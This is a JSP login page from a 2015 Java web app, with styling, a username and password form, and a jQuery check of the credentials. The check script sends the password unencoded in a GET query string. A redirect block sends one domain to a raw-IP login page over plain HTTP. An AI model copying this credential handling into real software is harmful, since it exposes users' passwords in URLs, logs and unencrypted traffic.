<%-- 
    Document   : LogIn
    Created on : Mar 11, 2015, 4:58:46 PM
    Author     : kiwi
--%>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<%@taglib prefix="t" tagdir="/WEB-INF/tags" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%@ taglib prefix="fn" uri="http://java.sun.com/jsp/jstl/functions"%>
<t:indexpage>
     <c:if test="${fn:containsIgnoreCase(pageContext.request.requestURI, 'carpathianroad.com')}">
        <script>window.location.href = "http://88.81.239.23:59180/en/login";</script>
    </c:if>
    <style>
        .btn-login {
            background: rgb(86,105,143);
            width: 97px;
            height: 40px;
            color: #fff;
            border: none;
        }
        .btn-login.cncl {
            background: rgb(189, 48, 48);
        }
        .login-block {
            text-align: center;
            width: 15%;
            margin: auto;
            height: 50%;
        }
        .login-block input {
            border-radius: 0px;
        }
        .login-block label {
            font: 11pt 'Open Sans';
            font-weight: 600;
            line-height: 25px;
            padding: 10px 0px 10px 60px;
            float: left;
            text-decoration: none;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
    </style>
    <section id="content">
        <div class="login-block">
            <form action="${Constants.URL}system/login.do" method="POST" id="loginForm" name="auth">
          
                                        <div class="row add-row">
						<div class="field">
                                                    <div class="form-group">
                                                        <label for="username">Username</label>
                                                        <input type="text" name="username" class="form-control" id="username">
                                                      
                                                    </div>
						</div>
                                        </div>
                                        <div class="row add-row">
						<div class="field">
                                                    <div class="form-group">
                                                        <label for="passwd">Password</label>
                                                        <input type="password" name="password" class="form-control" id="passwd">
                                                        <div class="validation"></div>
                                                    </div>
						</div>
                                        </div>
              </form>
                <div class="row add-row">
                    <div class="field">
                        <button class="btn-login cncl" type="reset" >Cancel</button>
                        <button class="btn-login" id="log-button">Log In</button>
                        
                    </div>
                                        
                </div>
        </div>
    </section>
<script>
    $( document ).ready(function() {
        
    $(".btn-login.cncl").click(function(){
        $("#username").val("");
        $("#passwd").val("");
    });
    $("#log-button").click(function(){
        $(".validation").html("");
        $.ajax({
         type: "get",
         url: "${Constants.URL}system/checkLoginPass/",
         cache: false,    
         data:'login='+ $("#username").val() +'&password='+$("#passwd").val(),
         success: function(response){
             console.log(response);
          if(response === "false"){
              $(".validation").html("<span style='color:red'>Bad login or password</span>");
          }
          else {
              $("#loginForm").submit();
          }
         },
         error: function(response){      
          console.log(response);
         }
        });
    });  
    });
</script>
</t:indexpage>